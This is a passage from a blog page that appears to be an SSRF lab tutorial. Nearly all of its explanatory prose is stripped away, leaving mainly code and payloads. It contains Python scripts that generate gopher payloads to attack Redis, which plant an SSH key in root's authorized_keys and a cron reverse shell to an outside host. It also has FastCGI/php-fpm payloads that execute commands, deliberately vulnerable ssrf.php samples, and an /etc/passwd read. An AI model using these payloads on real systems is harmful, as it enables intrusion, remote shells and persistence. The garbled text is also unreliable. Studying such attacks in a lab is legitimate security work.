class=\"line\">\tCRLF=&quot;\\\\r\\\\n&quot;</span><br><span class=\"line\">\tredis\\_arr = arr.split(&quot; &quot;)</span><br><span class=\"line\">\tcmd=&quot;&quot;</span><br><span class=\"line\">\tcmd+=&quot;\\*&quot;+str(len(redis\\_arr))</span><br><span class=\"line\">\tfor x in redis\\_arr:</span><br><span class=\"line\">\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class=\"line\">\tcmd+=CRLF</span><br><span class=\"line\">\treturn cmd</span><br><span class=\"line\"></span><br><span class=\"line\">if \\_\\_name\\_\\_==&quot;\\_\\_main\\_\\_&quot;:</span><br><span class=\"line\">\tfor x in cmd:</span><br><span class=\"line\">\t\tpayload += urllib.quote(redis\\_format(x))</span><br><span class=\"line\">\tprint payload</span><br></pre></td></tr></table></figure>\n\n<p>payloadurlUbuntuSSRF</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524568%250D%250A%250A%250Assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E%2F45IEs%2F9a6AWfXb6iwzo%252BD62y8MOmt%252Bsct27ZxGOcRR95FT6zrfFxqt2h56oLwml%2FTrxy5sExSQ%2FcvvLwUTWb3ntJYyh2eGkQnOf2d%252Bax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH%2F4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd%2FbWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ%2FNnHKyWtI%2FOzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe%252BXqQnjxtk4giopiFfRu8winE9scqlIA5Iu%2Fd3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg%2FOOhoA3iKNhJ%2FJT31TU9E24dGh2Ei8K%252BPpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl%252BSOsVHpNqwFcrgsq%2FWR5BGqnu54vTTdJh0pSrl%252BtniHEnWWU%253D%2520root%2540whoami%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A%2Froot%2F.ssh%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized\\_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure>\n\n<p>192.168.52.131SSH</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598028_5fffc68c0f8d37e46a560.png!small\"\n                        alt=\"image-20210113185745287\"\n                 ></p>\n<p>ssh</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598029_5fffc68d802a6e5c757d2.png!small\"\n                        alt=\"image-20210113193746288\"\n                 ></p>\n<h3 id=\"Shell\"><a href=\"#Shell\" class=\"headerlink\" title=\"Shell\"></a>Shell</h3><p><strong>Centos</strong></p>\n<p>redis</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flushall  </span><br><span class=\"line\">set 1 &#x27;\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1\\\\n\\\\n&#x27;  </span><br><span class=\"line\">config set dir /var/spool/cron/  </span><br><span class=\"line\">config set dbfilename root  </span><br><span class=\"line\">save  </span><br><span class=\"line\"></span><br><span class=\"line\">// 47.xxx.xxx.72vpsIP</span><br><span class=\"line\"></span><br><span class=\"line\">Gopher</span><br><span class=\"line\"></span><br><span class=\"line\">import urllib</span><br><span class=\"line\">protocol=&quot;gopher://&quot;</span><br><span class=\"line\">ip=&quot;192.168.52.131&quot;</span><br><span class=\"line\">port=&quot;6379&quot;</span><br><span class=\"line\">reverse\\_ip=&quot;47.xxx.xxx.72&quot;</span><br><span class=\"line\">reverse\\_port=&quot;2333&quot;</span><br><span class=\"line\">cron=&quot;\\\\n\\\\n\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\\\\n\\\\n\\\\n\\\\n&quot;%(reverse\\_ip,reverse\\_port)</span><br><span class=\"line\">filename=&quot;root&quot;</span><br><span class=\"line\">path=&quot;/var/spool/cron&quot;</span><br><span class=\"line\">passwd=&quot;&quot;</span><br><span class=\"line\">cmd=\\[&quot;flushall&quot;,</span><br><span class=\"line\">\t &quot;set 1 &#123;&#125;&quot;.format(cron.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),</span><br><span class=\"line\">\t &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class=\"line\">\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class=\"line\">\t &quot;save&quot;</span><br><span class=\"line\">\t \\]</span><br><span class=\"line\">if passwd:</span><br><span class=\"line\">\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class=\"line\">payload=protocol+ip+&quot;:&quot;+port+&quot;/\\_&quot;</span><br><span class=\"line\">def redis\\_format(arr):</span><br><span class=\"line\">\tCRLF=&quot;\\\\r\\\\n&quot;</span><br><span class=\"line\">\tredis\\_arr = arr.split(&quot; &quot;)</span><br><span class=\"line\">\tcmd=&quot;&quot;</span><br><span class=\"line\">\tcmd+=&quot;\\*&quot;+str(len(redis\\_arr))</span><br><span class=\"line\">\tfor x in redis\\_arr:</span><br><span class=\"line\">\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class=\"line\">\tcmd+=CRLF</span><br><span class=\"line\">\treturn cmd</span><br><span class=\"line\"></span><br><span class=\"line\">if \\_\\_name\\_\\_==&quot;\\_\\_main\\_\\_&quot;:</span><br><span class=\"line\">\tfor x in cmd:</span><br><span class=\"line\">\t\tpayload += urllib.quote(redis\\_format(x))</span><br><span class=\"line\">\tprint payload</span><br></pre></td></tr></table></figure>\n\n<p>payloadurlUbuntuSSRF192.168.52.131vpsshell</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202362.jpeg\"\n                        alt=\"image-20210113184927766\"\n                 ></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/qq_45521281/article/details/106532501\" >[GKCTF2020]EZ-EzWeb<i class=\"fas fa-external-link-alt\"></i></a>Redis</p>\n<h2 id=\"FastCGI\"><a href=\"#FastCGI\" class=\"headerlink\" title=\"FastCGI\"></a>FastCGI</h2><p>FastCGIFast Common Gateway InterfaceFastCGIWebFastCGICGIFastCGICGI</p>\n<blockquote>\n<p><strong></strong><strong></strong>ApacheWebCGICGIPHPPHPphp.iniCGIWeb serverPHP Web</p>\n<p>CGIFastCGICGICGI<strong>CGI</strong><strong>FastCGICGI</strong> </p>\n</blockquote>\n<h3 id=\"php-fpm\"><a href=\"#php-fpm\" class=\"headerlink\" title=\"php-fpm\"></a>php-fpm</h3><p>FPMFastCGI FastCGI PHP FastCGI </p>\n<p>FastCGI<code>SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php</code>php-fpmphp-fpm</p>\n<p>PHP 5.3.9PHPphp-fpmphpphp4PHPPHP_ADMIN_VALUEPHP_VALUEPHP</p>\n<p>PHP<code>auto_prepend_file = php://input;allow_url_include = On</code>PHP<code>auto_prepend_file</code><code>php://input</code>POSTFastCGIbodyphp-fpm</p>\n<p><a class=\"link\"   href=\"https://bbs.ichunqiu.com/thread-58455-1-1.html\" >SSRFFastCGI<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202250.jpeg\"\n                        alt=\"image-20210113225311760\"\n                 ></p>\n<p>WEBUbuntu192.168.43.166SSRF</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598034_5fffc69243862a502d80a.png!small\"\n                        alt=\"image-20210113211319025\"\n                 ></p>\n<p>WEBUbuntuFastCGISSRFFastCGI</p>\n<blockquote>\n<p>fpm0.0.0.0:9000php-fpmSSRF9000php-fpmfcgi_expphp-fpm</p>\n<p>fpm0.0.0.0:9000php-fpmUbuntuSSRFphp-fpmUbuntuSSRF</p>\n</blockquote>\n<h3 id=\"fcgi-exp\"><a href=\"#fcgi-exp\" class=\"headerlink\" title=\"fcgi_exp\"></a>fcgi_exp</h3><p><a class=\"link\"   href=\"https://github.com/piaca/fcgi_exp\" >https://github.com/piaca/fcgi_exp<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>php-fpmphp-fpmpayload</p>\n<p>go</p>\n<p>go build fcgi_exp.go                    # fcgi_exp.go</p>\n<p><code>nc -lvvp 2333 &gt; fcg_exp.txt</code>2333 fcgi_exppayload2333payload</p>\n<p>.&#x2F;fcgi_exp system 127.0.0.1 2333 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php id</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202135.jpeg\"\n                        alt=\"image-20210113205718209\"\n                 ></p>\n<p>fcg_exp.txtpayload</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598036_5fffc694cc3e3da7a21ec.png!small\"\n                        alt=\"image-20210113205857913\"\n                 ></p>\n<p>fcg_exp.txtpayloadurl</p>\n<p># -*- coding: UTF-8 -*-<br>from urllib.parse import quote, unquote, urlencode  </p>\n<p>file &#x3D; open(fcg_exp.txt,r)<br>payload &#x3D; file.read()<br>print(gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_+quote(payload).replace(%0A,%0D).replace(%2F,&#x2F;))</p>\n<p>pythonpayload</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202737.jpeg\"\n                        alt=\"image-20210113210102251\"\n                 ></p>\n<p>payloadurlpayload?url&#x3D;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2514%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP%2F1.1%250E%2502CONTENT\\_LENGTH56%250E%2504REQUEST\\_METHODPOST%2509%255BPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Ddisable\\_functions%2520%253D%2520%250Dsafe\\_mode%2520%253D%2520Off%250Dauto\\_prepend\\_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT\\_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT\\_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2500%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----0vcdb34oju09b8fd-----%250D%2527%2529%253B%253F%253E</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598040_5fffc6982e020c76d98d2.png!small\"\n                        alt=\"image-20210113211227610\"\n                 ></p>\n<h3 id=\"Gopherus\"><a href=\"#Gopherus\" class=\"headerlink\" title=\"Gopherus\"></a>Gopherus</h3><p><a class=\"link\"   href=\"https://github.com/tarunkant/Gopherus\" >https://github.com/tarunkant/Gopherus<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>GopherpayloadSSRFRedisFastCGIMySql</p>\n<p>GopherusFastCGIpayload</p>\n<p>python gopherus.py exploit fastcgi<br>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php    # php<br>id    # </p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598041_5fffc69924b889c84f935.png!small\"\n                        alt=\"image-20201206134630782\"\n                 ></p>\n<p>payloadurlpayload?url&#x3D;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssrf.php?url=gopher%3A//127.0.0.1%3A9000/\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP/1.1%250E%2502CONTENT\\_LENGTH54%250E%2504REQUEST\\_METHODPOST%2509KPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Adisable\\_functions%2520%253D%2520%250Aauto\\_prepend\\_file%2520%253D%2520php%253A//input%250F%2517SCRIPT\\_FILENAME/var/www/html/index.php%250D%2501DOCUMENT\\_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202253.jpeg\"\n                        alt=\"image-20210113211649519\"\n                 ></p>\n<p></p>\n<h2 id=\"MySql\"><a href=\"#MySql\" class=\"headerlink\" title=\"MySql\"></a>MySql</h2><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202474.jpeg\"\n                        alt=\"20210113152106.png\"\n                 ></p>\n<p>MySqlMySQLMySQL &#x2F; (scramble)</p>\n<p>(scramble)Gopher</p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598044_5fffc69c8db745aea464b.png!small\"\n                        alt=\"image-20210113225607672\"\n                 ></p>\n<p>UbuntuWEBSSRFMySqlwhoami</p>\n<p>GopherusUbuntuMySqlpayload</p>\n<p>python gopherus.py exploit mysql<br>whoami    # <br>show databases;    # sql</p>\n<p>payload</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598046_5fffc69e8d085bc01c7a3.png!small\"\n                        alt=\"image-20210114004602164\"\n                 ></p>\n<p>paylaodurlpayload?url&#x3D;</p>\n<h2 id=\"Ending\"><a href=\"#Ending\" class=\"headerlink\" title=\"Ending\"></a>Ending</h2><p>SSRF</p>\n<ul>\n<li>ssrf-lab<a class=\"link\"   href=\"https://github.com/fengwenhua/ssrf-lab\" >https://github.com/fengwenhua/ssrf-lab<i class=\"fas fa-external-link-alt\"></i></a></li>\n</ul>\n<p> REST API  WebHook  SSRF <a class=\"link\"   href=\"https://www.heibai.org/post/1287.html\" >https://www.heibai.org/post/1287.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202809.jpeg\"\n                        alt=\"20210112124413.jpg\"\n                 ></p>\n<p></p>\n<p><a class=\"link\"   href=\"https://whoamianony.top/\" >https://whoamianony.top/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<blockquote>\n<p> <a class=\"link\"   href=\"https://blog.csdn.net/Ping_Pig/article/details/99412487\" >https://blog.csdn.net/Ping_Pig&#x2F;article&#x2F;details&#x2F;99412487<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/iors/p/9777571.html\" >https://www.cnblogs.com/iors/p/9777571.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/qq_43625917/article/details/104528645?utm_source=app\" >https://blog.csdn.net/qq_43625917&#x2F;article&#x2F;details&#x2F;104528645?utm_source&#x3D;app<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://xz.aliyun.com/t/2115\" >https://xz.aliyun.com/t/2115<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_36343353/article/details/112277580\" >https://blog.csdn.net/weixin_36343353&#x2F;article&#x2F;details&#x2F;112277580<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/cj_Allen/article/details/106855893\" >https://blog.csdn.net/cj_Allen&#x2F;article&#x2F;details&#x2F;106855893<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/#Redis%E9%85%8D%E5%90%88gopher%E5%8D%8F%E8%AE%AE%E8%BF%9B%E8%A1%8CSSRF\" >https://www.redteaming.top/2019/07/15/RedisSSRF/#RedisgopherSSRF<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://bbs.ichunqiu.com/thread-58455-1-1.html\" >https://bbs.ichunqiu.com/thread-58455-1-1.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.chaitin.cn/gopher-attack-surfaces/\" >https://blog.chaitin.cn/gopher-attack-surfaces/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.anquanke.com/post/id/197431#h2-6\" >https://www.anquanke.com/post/id/197431#h2-6<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.anquanke.com/post/id/145519#h2-14\" >https://www.anquanke.com/post/id/145519#h2-14<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]},"cdn":{"enable":true,"provider":"jsdelivr"}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201984.jpeg\"\n                        alt=\"SSRF\"\n                 ></p>\n<blockquote>\n<p>FreeBufFreeBuf</p>\n</blockquote>\n<p>CTFSSRFSSRFSSRF</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>SSRFServer-Side Request Forgery:SSRF</p>\n<p>SSRF URLSSRFWEB</p>\n<p>UbuntuWEBUbuntuWEBSSRFWEBRedisMySqlFastCGIWEB<img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610597995_5fffc66bd4875385a330e.png!small\"\n                        alt=\"image-20210112220229389\"\n                 ></p>\n<p><strong>SSRF</strong></p>\n<blockquote>\n<ol>\n<li><p></p>\n</li>\n<li><p>URL</p>\n</li>\n<li><p></p>\n</li>\n<li><p>&#x2F;URL</p>\n</li>\n<li><p>&#x2F;URLtitle</p>\n</li>\n<li><p>ssrf</p>\n</li>\n<li><p>url</p>\n</li>\n<li><p>mongodbcopyDatabase</p>\n</li>\n<li><p></p>\n</li>\n<li><p>ffpmgImageMagickdocxpdfxml</p>\n</li>\n<li><p>apiURLgoogleSSRFurlsharewapurllinksrcsourcetargetu3gdisplaysourceURlimageURLdomain</p>\n</li>\n<li><p></p>\n</li>\n</ol>\n</blockquote>\n<p><strong>SSRF</strong></p>\n<blockquote>\n<ol>\n<li><p>banner</p>\n</li>\n<li><p>redismysql</p>\n</li>\n<li><p>Web</p>\n</li>\n<li><p>WebHTTP GET&#x2F;POSTsql</p>\n</li>\n<li><p>file</p>\n</li>\n<li><p></p>\n</li>\n</ol>\n</blockquote>\n<h2 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h2><ul>\n<li><p>file_get_contents()url</p>\n</li>\n<li><p>readfile()</p>\n</li>\n<li><p>fsockopen()Unix </p>\n</li>\n<li><p>curl_exec()cURLcurl_setopt()curl_exec()curl_close() </p>\n</li>\n<li><p>fopen() URL</p>\n</li>\n<li><p></p>\n</li>\n</ul>\n<p>SSRF PHPSoapClientSSRF</p>\n<h3 id=\"file-get-contents\"><a href=\"#file-get-contents\" class=\"headerlink\" title=\"file_get_contents()\"></a>file_get_contents()</h3><p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$url = $\\_GET\\[&#x27;url&#x27;\\];;</span><br><span class=\"line\">echo file\\_get\\_contents($url);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>file_get_contents() url<code>ssrf.php?url=../../../../../etc/passwd</code>paylaod</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610597996_5fffc66c9d8087b2c3242.png!small\"\n                        alt=\"image-20210112225820457\"\n                 ></p>\n<p>readfile()file_get_contents()</p>\n<h3 id=\"fsockopen\"><a href=\"#fsockopen\" class=\"headerlink\" title=\"fsockopen()\"></a>fsockopen()</h3><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>Unix hostnameurlsockettcp fsockopen()fgets()fgetss()fwrite()fclose()feof()false</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$host=$\\_GET\\[&#x27;url&#x27;\\];</span><br><span class=\"line\">$fp = fsockopen($host, 80, $errno, $errstr, 30);</span><br><span class=\"line\">if (!$fp) &#123;</span><br><span class=\"line\">    echo &quot;$errstr ($errno)&lt;br /&gt;\\\\n&quot;;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    $out = &quot;GET / HTTP/1.1\\\\r\\\\n&quot;;</span><br><span class=\"line\">    $out .= &quot;Host: $host\\\\r\\\\n&quot;;</span><br><span class=\"line\">    $out .= &quot;Connection: Close\\\\r\\\\n\\\\r\\\\n&quot;;</span><br><span class=\"line\">    fwrite($fp, $out);</span><br><span class=\"line\">    while (!feof($fp)) &#123;</span><br><span class=\"line\">        echo fgets($fp, 128);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fclose($fp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>ssrf.php?url=www.baidu.com</code>ssrf</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201642.jpeg\"\n                        alt=\"image-20210112230552313\"\n                 ></p>\n<h3 id=\"curl-exec\"><a href=\"#curl-exec\" class=\"headerlink\" title=\"curl_exec()\"></a>curl_exec()</h3><p>curl_init(url)cURLcurl_setopt()curl_exec()curl_close() </p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">if (isset($\\_GET\\[&#x27;url&#x27;\\]))&#123;</span><br><span class=\"line\">\t$link = $\\_GET\\[&#x27;url&#x27;\\];</span><br><span class=\"line\">\t$curlobj = curl\\_init(); //  cURL </span><br><span class=\"line\">\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);</span><br><span class=\"line\">\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);</span><br><span class=\"line\">\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); //  URL </span><br><span class=\"line\">\t$result=curl\\_exec($curlobj); //  URL </span><br><span class=\"line\">\tcurl\\_close($curlobj); //  cURL </span><br></pre></td></tr></table></figure>\n\n\n\n<pre><code>// $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;\n// file\\_put\\_contents($filename, $result); \necho $result;\n</code></pre>\n<p>}<br>?&gt;</p>\n<p><code>ssrf.php?url=www.baidu.com</code>ssrf</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201758.jpeg\"\n                        alt=\"image-20210112231108247\"\n                 ></p>\n<h3 id=\"SoapClient\"><a href=\"#SoapClient\" class=\"headerlink\" title=\"SoapClient\"></a>SoapClient</h3><p>SOAPSOAP XML  WEB PHP  SoapClient SOAP WEB  PHP </p>\n<p>SoapClientphp<code>__call</code><code>__call</code>HTTPHTTPS</p>\n<p>public SoapClient :: SoapClient(mixed $wsdl [array $options ])</p>\n<ul>\n<li><p>wsdl</p>\n</li>\n<li><p>wsdlwsdllocationurilocationSOAPURL uri 